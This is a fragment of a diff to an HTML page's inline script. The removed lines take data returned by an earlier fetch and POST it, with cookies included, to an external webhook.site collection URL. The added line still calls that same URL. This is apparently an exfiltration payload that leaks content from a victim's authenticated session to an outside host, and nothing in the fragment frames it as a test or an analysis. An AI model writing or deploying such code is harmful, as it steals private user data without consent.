@@ -13,17 +13,7 @@
         })
         .then(response => response.text())
         .then(data => {
-            fetch("https://webhook.site/b6b6265c-2121-43e7-83e9-1dcc151dc86f", {
-            method: "POST",
-            credentials: "include",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ info: data })
-        })
-        .then(res => res.text())
-        .then(finalData => console.log(finalData));
-        });
+            fetch("https://webhook.site/b6b6265c-2121-43e7-83e9-1dcc151dc86f"); });
     </script>
 </body>
 </html>
